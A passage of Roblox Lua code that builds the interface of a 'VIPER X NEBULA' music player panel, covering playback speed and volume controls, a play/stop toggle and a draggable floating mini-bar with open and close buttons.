    spdValLabel.Font = Enum.Font.GothamBlack
    spdValLabel.TextSize = 13
    spdValLabel.TextXAlignment = Enum.TextXAlignment.Center
    spdValLabel.ZIndex = 3
    spdValLabel.Parent = speedRow

    local spdPlusBtn = Instance.new("TextButton")
    spdPlusBtn.Name = "SpdPlus"
    spdPlusBtn.Size = UDim2.new(0, 26, 0, 26)
    spdPlusBtn.Position = UDim2.new(1, -34, 0.5, -13)
    spdPlusBtn.BackgroundColor3 = Color3.fromRGB(28, 22, 44)
    spdPlusBtn.BackgroundTransparency = 0.3
    spdPlusBtn.Text = "+"
    spdPlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    spdPlusBtn.Font = Enum.Font.GothamBlack
    spdPlusBtn.TextSize = 15
    spdPlusBtn.AutoButtonColor = false
    spdPlusBtn.ZIndex = 3
    spdPlusBtn.Parent = speedRow

    local spdPlusCorner = Instance.new("UICorner")
    spdPlusCorner.CornerRadius = UDim.new(0, 7)
    spdPlusCorner.Parent = spdPlusBtn

    local function updateSpeedUI()
        local spd = getPlaybackSpeed()
        Config.musicSpeed = spd
        sound.PlaybackSpeed = spd
        spdValLabel.Text = tostring(math.floor(spd * 100 + 0.5)) .. "%"
    end

    spdMinusBtn.MouseButton1Click:Connect(function()
        Config.musicSpeed = getPlaybackSpeed() - 0.1
        updateSpeedUI()
    end)

    spdPlusBtn.MouseButton1Click:Connect(function()
        Config.musicSpeed = getPlaybackSpeed() + 0.1
        updateSpeedUI()
    end)

    local spdResetBtn = Instance.new("TextButton")
    spdResetBtn.Size = UDim2.new(1, -150, 1, 0)
    spdResetBtn.Position = UDim2.new(0, 90, 0, 0)
    spdResetBtn.BackgroundTransparency = 1
    spdResetBtn.Text = ""
    spdResetBtn.ZIndex = 4
    spdResetBtn.Parent = speedRow

    spdResetBtn.MouseButton1Click:Connect(function()
        Config.musicSpeed = 1
        updateSpeedUI()
    end)

    updateSpeedUI()

    local volRow = Instance.new("Frame")
    volRow.Name = "VolumeRow"
    volRow.Size = UDim2.new(1, -20, 0, 36)
    volRow.Position = UDim2.new(0, 10, 0, 276)
    volRow.BackgroundColor3 = Color3.fromRGB(20, 16, 32)
    volRow.BackgroundTransparency = 0.6 -- Yarı saydam
    volRow.BorderSizePixel = 0
    volRow.ZIndex = 2
    volRow.Parent = mainFrame

    local volCorner = Instance.new("UICorner")
    volCorner.CornerRadius = UDim.new(0, 8)
    volCorner.Parent = volRow

    local volTitle = Instance.new("TextLabel")
    volTitle.Size = UDim2.new(0, 52, 1, 0)
    volTitle.Position = UDim2.new(0, 10, 0, 0)
    volTitle.BackgroundTransparency = 1
    volTitle.Text = "VOLUME"
    volTitle.TextColor3 = Color3.fromRGB(210, 210, 230)
    volTitle.Font = Enum.Font.GothamBlack
    volTitle.TextSize = 9
    volTitle.TextXAlignment = Enum.TextXAlignment.Left
    volTitle.ZIndex = 3
    volTitle.Parent = volRow

    local volMinusBtn = Instance.new("TextButton")
    volMinusBtn.Name = "VolMinus"
    volMinusBtn.Size = UDim2.new(0, 26, 0, 26)
    volMinusBtn.Position = UDim2.new(0, 58, 0.5, -13)
    volMinusBtn.BackgroundColor3 = Color3.fromRGB(28, 22, 44)
    volMinusBtn.BackgroundTransparency = 0.3
    volMinusBtn.Text = "-"
    volMinusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    volMinusBtn.Font = Enum.Font.GothamBlack
    volMinusBtn.TextSize = 14
    volMinusBtn.AutoButtonColor = false
    volMinusBtn.ZIndex = 3
    volMinusBtn.Parent = volRow

    local volMinusCorner = Instance.new("UICorner")
    volMinusCorner.CornerRadius = UDim.new(0, 7)
    volMinusCorner.Parent = volMinusBtn

    local volValLabel = Instance.new("TextLabel")
    volValLabel.Name = "VolVal"
    volValLabel.Size = UDim2.new(1, -150, 0, 20)
    volValLabel.Position = UDim2.new(0, 90, 0.5, -10)
    volValLabel.BackgroundTransparency = 1
    volValLabel.Text = "60%"
    volValLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    volValLabel.Font = Enum.Font.GothamBlack
    volValLabel.TextSize = 13
    volValLabel.TextXAlignment = Enum.TextXAlignment.Center
    volValLabel.ZIndex = 3
    volValLabel.Parent = volRow

    local volPlusBtn = Instance.new("TextButton")
    volPlusBtn.Name = "VolPlus"
    volPlusBtn.Size = UDim2.new(0, 26, 0, 26)
    volPlusBtn.Position = UDim2.new(1, -34, 0.5, -13)
    volPlusBtn.BackgroundColor3 = Color3.fromRGB(28, 22, 44)
    volPlusBtn.BackgroundTransparency = 0.3
    volPlusBtn.Text = "+"
    volPlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    volPlusBtn.Font = Enum.Font.GothamBlack
    volPlusBtn.TextSize = 15
    volPlusBtn.AutoButtonColor = false
    volPlusBtn.ZIndex = 3
    volPlusBtn.Parent = volRow

    local volPlusCorner = Instance.new("UICorner")
    volPlusCorner.CornerRadius = UDim.new(0, 7)
    volPlusCorner.Parent = volPlusBtn

    local function updateVolumeUI()
        local vol = math.clamp(sound.Volume, 0, Config.maxVolume)
        sound.Volume = vol
        volValLabel.Text = tostring(math.floor(vol * 100 + 0.5)) .. "%"
    end

    volMinusBtn.MouseButton1Click:Connect(function()
        local currentVol = sound.Volume
        local nextVol = math.clamp(currentVol - 0.1, 0, Config.maxVolume)
        sound.Volume = nextVol
        updateVolumeUI()
    end)

    volPlusBtn.MouseButton1Click:Connect(function()
        local currentVol = sound.Volume
        local nextVol = math.clamp(currentVol + 0.1, 0, Config.maxVolume)
        sound.Volume = nextVol
        updateVolumeUI()
    end)

    local volResetBtn = Instance.new("TextButton")
    volResetBtn.Size = UDim2.new(1, -150, 1, 0)
    volResetBtn.Position = UDim2.new(0, 90, 0, 0)
    volResetBtn.BackgroundTransparency = 1
    volResetBtn.Text = ""
    volResetBtn.ZIndex = 4
    volResetBtn.Parent = volRow

    volResetBtn.MouseButton1Click:Connect(function()
        if sound.Volume < 1.0 then
            sound.Volume = 1.0
        elseif sound.Volume < 2.0 then
            sound.Volume = 2.0
        elseif sound.Volume < 3.0 then
            sound.Volume = 3.0
        else
            sound.Volume = 1.0
        end
        updateVolumeUI()
    end)

    updateVolumeUI()

    local masterBtn = Instance.new("TextButton")
    masterBtn.Name = "MasterToggleBtn"
    masterBtn.Size = UDim2.new(1, -20, 0, 28)
    masterBtn.Position = UDim2.new(0, 10, 0, 316)
    masterBtn.Text = "ACTIVE MUSIC"
    masterBtn.BackgroundColor3 = Color3.fromRGB(18, 48, 32)
    masterBtn.BackgroundTransparency = 0.2
    masterBtn.TextColor3 = Color3.fromRGB(140, 255, 190)
    masterBtn.Font = Enum.Font.GothamBold
    masterBtn.TextSize = 11
    masterBtn.ZIndex = 4
    masterBtn.Parent = mainFrame

    local masterCorner = Instance.new("UICorner")
    masterCorner.CornerRadius = UDim.new(0, 8)
    masterCorner.Parent = masterBtn

    local masterStroke = Instance.new("UIStroke")
    masterStroke.Thickness = 1
    masterStroke.Color = Color3.fromRGB(40, 90, 55)
    masterStroke.Parent = masterBtn

    syncStateFn = function(isPlaying)
        if isPlaying then
            masterBtn.Text = "STOP MUSIC"
            masterBtn.BackgroundColor3 = Color3.fromRGB(48, 18, 32)
            masterBtn.TextColor3 = Color3.fromRGB(255, 180, 200)
            masterStroke.Color = Color3.fromRGB(80, 35, 45)
        else
            masterBtn.Text = "ACTIVE MUSIC"
            masterBtn.BackgroundColor3 = Color3.fromRGB(18, 48, 32)
            masterBtn.TextColor3 = Color3.fromRGB(140, 255, 190)
            masterStroke.Color = Color3.fromRGB(40, 90, 55)
        end
    end

    local function toggleMasterPlayback()
        if sound.IsPlaying then
            currentPlayToken = currentPlayToken + 1
            pcall(function() sound:Stop() end)
            currentPlayingFile = nil
            highlightSong(nil)
            syncStateFn(false)
            return false
        end

        local track = lastSelectedSong or SongList[1]
        local idx = lastSelectedIndex or 1
        if track then
            playSongTrack(track, scrollFrame:FindFirstChild("MusicBtn" .. idx), idx)
        end
        return true
    end

    masterBtn.MouseButton1Click:Connect(toggleMasterPlayback)

    local floatBar = Instance.new("Frame")
    floatBar.Name = "FloatBar"
    floatBar.AnchorPoint = Vector2.new(0.5, 0.5)
    floatBar.Position = UDim2.new(0.5, 0, 0.55, 0)
    floatBar.Size = UDim2.new(0, 220, 0, 118)
    floatBar.BackgroundColor3 = Color3.fromRGB(12, 10, 20)
    floatBar.BackgroundTransparency = 0.35
    floatBar.BorderSizePixel = 0
    floatBar.Visible = false
    floatBar.ZIndex = 50
    floatBar.ClipsDescendants = true
    floatBar.Parent = gui

    local floatCorner = Instance.new("UICorner")
    floatCorner.CornerRadius = UDim.new(0, 16)
    floatCorner.Parent = floatBar

    local floatScale = Instance.new("UIScale")
    floatScale.Name = "FloatScale"
    floatScale.Scale = Config.uiScale
    floatScale.Parent = floatBar
    floatScaleRef = floatScale

    local floatStroke = Instance.new("UIStroke")
    floatStroke.Thickness = 1.3
    floatStroke.Color = Color3.fromRGB(200, 170, 255)
    floatStroke.Transparency = 0.35
    floatStroke.Parent = floatBar

    local floatBg = Instance.new("ImageLabel")
    floatBg.Size = UDim2.new(1, 0, 1, 0)
    floatBg.BackgroundTransparency = 1
    floatBg.Image = Config.backgroundImage
    floatBg.ImageTransparency = 0.05
    floatBg.ScaleType = Enum.ScaleType.Crop
    floatBg.ZIndex = 50
    floatBg.Parent = floatBar

    local floatBgCorner = Instance.new("UICorner")
    floatBgCorner.CornerRadius = UDim.new(0, 16)
    floatBgCorner.Parent = floatBg

    local floatTitle = Instance.new("TextLabel")
    floatTitle.AnchorPoint = Vector2.new(0.5, 0)
    floatTitle.Position = UDim2.new(0.5, 0, 0, 10)
    floatTitle.Size = UDim2.new(1, -24, 0, 20)
    floatTitle.BackgroundTransparency = 1
    floatTitle.Text = "VIPER X NEBULA MUSIC PLAYER"
    floatTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    floatTitle.TextSize = 14
    floatTitle.Font = Enum.Font.GothamBlack
    floatTitle.ZIndex = 52
    floatTitle.Parent = floatBar

    local floatDiscord = Instance.new("TextLabel")
    floatDiscord.AnchorPoint = Vector2.new(0.5, 0)
    floatDiscord.Position = UDim2.new(0.5, 0, 0, 30)
    floatDiscord.Size = UDim2.new(1, -24, 0, 12)
    floatDiscord.BackgroundTransparency = 1
    floatDiscord.Text = "discord.gg/noxaduels"
    floatDiscord.TextColor3 = Color3.fromRGB(210, 210, 230)
    floatDiscord.TextSize = 9
    floatDiscord.Font = Enum.Font.GothamMedium
    floatDiscord.ZIndex = 52
    floatDiscord.Parent = floatBar

    local floatPlayBtn = Instance.new("TextButton")
    floatPlayBtn.AnchorPoint = Vector2.new(0.5, 0)
    floatPlayBtn.Position = UDim2.new(0.5, 0, 0, 48)
    floatPlayBtn.Size = UDim2.new(1, -24, 0, 32)
    floatPlayBtn.BackgroundColor3 = Color3.fromRGB(18, 48, 32)
    floatPlayBtn.BackgroundTransparency = 0.2
    floatPlayBtn.BorderSizePixel = 0
    floatPlayBtn.Text = "ACTIVATE"
    floatPlayBtn.TextColor3 = Color3.fromRGB(140, 255, 190)
    floatPlayBtn.TextSize = 12
    floatPlayBtn.Font = Enum.Font.GothamBlack
    floatPlayBtn.AutoButtonColor = false
    floatPlayBtn.ZIndex = 53
    floatPlayBtn.Parent = floatBar

    local floatPlayCorner = Instance.new("UICorner")
    floatPlayCorner.CornerRadius = UDim.new(0, 10)
    floatPlayCorner.Parent = floatPlayBtn

    local floatPlayStroke = Instance.new("UIStroke")
    floatPlayStroke.Thickness = 1.1
    floatPlayStroke.Color = Color3.fromRGB(40, 90, 55)
    floatPlayStroke.Transparency = 0.35
    floatPlayStroke.Parent = floatPlayBtn

    local floatCloseBtn = Instance.new("TextButton")
    floatCloseBtn.AnchorPoint = Vector2.new(1, 0)
    floatCloseBtn.Position = UDim2.new(1, -8, 0, 8)
    floatCloseBtn.Size = UDim2.new(0, 20, 0, 20)
    floatCloseBtn.BackgroundColor3 = Color3.fromRGB(48, 18, 32)
    floatCloseBtn.BackgroundTransparency = 0.2
    floatCloseBtn.BorderSizePixel = 0
    floatCloseBtn.Text = "X"
    floatCloseBtn.TextColor3 = Color3.fromRGB(255, 180, 200)
    floatCloseBtn.TextSize = 11
    floatCloseBtn.Font = Enum.Font.GothamBold
    floatCloseBtn.AutoButtonColor = true
    floatCloseBtn.ZIndex = 54
    floatCloseBtn.Parent = floatBar
    Instance.new("UICorner", floatCloseBtn).CornerRadius = UDim.new(0, 5)

    floatCloseBtn.MouseButton1Click:Connect(function()
        if type(_G.CloseMusicPanel) == "function" then
            _G.CloseMusicPanel()
        else
            gui:Destroy()
            if sound and sound.IsPlaying then pcall(function() sound:Stop() end) end
            _G.ViperSavedMusicPlayerOpen = false
            if saveAllSettings then saveAllSettings() end
            if _G.__RefreshMusicMenuBtn then _G.__RefreshMusicMenuBtn() end
        end
    end)

    local floatOpenBtn = Instance.new("TextButton")
    floatOpenBtn.AnchorPoint = Vector2.new(0.5, 0)
    floatOpenBtn.Position = UDim2.new(0.5, 0, 0, 84)
    floatOpenBtn.Size = UDim2.new(1, -24, 0, 24)
    floatOpenBtn.BackgroundColor3 = Color3.fromRGB(24, 20, 38)
    floatOpenBtn.BackgroundTransparency = 0.2
    floatOpenBtn.BorderSizePixel = 0
    floatOpenBtn.Text = "OPEN"
    floatOpenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    floatOpenBtn.TextSize = 11
    floatOpenBtn.Font = Enum.Font.GothamBold
    floatOpenBtn.AutoButtonColor = false
    floatOpenBtn.ZIndex = 53
    floatOpenBtn.Parent = floatBar

    local floatOpenCorner = Instance.new("UICorner")
    floatOpenCorner.CornerRadius = UDim.new(0, 6)
    floatOpenCorner.Parent = floatOpenBtn

    local floatOpenStroke = Instance.new("UIStroke")
    floatOpenStroke.Thickness = 1
    floatOpenStroke.Color = Color3.fromRGB(80, 50, 110)
    floatOpenStroke.Transparency = 0.45
    floatOpenStroke.Parent = floatOpenBtn

    local function updateFloatBarUI()
        if sound.IsPlaying then
            floatPlayBtn.Text = "STOP"
            floatPlayBtn.BackgroundColor3 = Color3.fromRGB(48, 18, 32)
            floatPlayBtn.TextColor3 = Color3.fromRGB(255, 180, 200)
            floatPlayStroke.Color = Color3.fromRGB(90, 25, 45)
            floatDiscord.Text = "ON · playing"
            floatDiscord.TextColor3 = Color3.fromRGB(140, 255, 190)
        else
            floatPlayBtn.Text = "ACTIVATE"
            floatPlayBtn.BackgroundColor3 = Color3.fromRGB(18, 48, 32)
            floatPlayBtn.TextColor3 = Color3.fromRGB(140, 255, 190)
            floatPlayStroke.Color = Color3.fromRGB(40, 90, 55)
            floatDiscord.Text = "discord.gg/noxaduels"
            floatDiscord.TextColor3 = Color3.fromRGB(210, 210, 230)
        end
    end

    local origSync = syncStateFn
    syncStateFn = function(active)
        if origSync then origSync(active) end
        updateFloatBarUI()
    end

    sound.Ended:Connect(function()
        updateFloatBarUI()
    end)

    closeBtn.MouseButton1Click:Connect(function()
        if type(_G.CloseMusicPanel) == "function" then
            _G.CloseMusicPanel()
        else
            gui:Destroy()
            if sound and sound.IsPlaying then pcall(function() sound:Stop() end) end
            _G.ViperSavedMusicPlayerOpen = false
            if saveAllSettings then saveAllSettings() end
            if _G.__RefreshMusicMenuBtn then _G.__RefreshMusicMenuBtn() end
        end
    end)

    floatOpenBtn.MouseButton1Click:Connect(function()
        mainFrame.Visible = true
        floatBar.Visible = false
        panelScale.Scale = Config.uiScale
    end)

    floatPlayBtn.MouseButton1Click:Connect(function()
        toggleMasterPlayback()
        updateFloatBarUI()
    end)

    makeDraggable(floatBar, floatBar)
end

local function closeMusicPanel()
    local guiParent = getGuiContainer()
    local existingGui = guiParent and guiParent:FindFirstChild("RestreintMusicPanel")
    if existingGui then
        existingGui:Destroy()
    end
    if sound and sound.IsPlaying then
        pcall(function() sound:Stop() end)
    end
    _G.ViperSavedMusicPlayerOpen = false
    if saveAllSettings then saveAllSettings() end
    if _G.__RefreshMusicMenuBtn then _G.__RefreshMusicMenuBtn() end
end

_G.CloseMusicPanel = closeMusicPanel
_G.OpenMusicPanel = openMusicPanel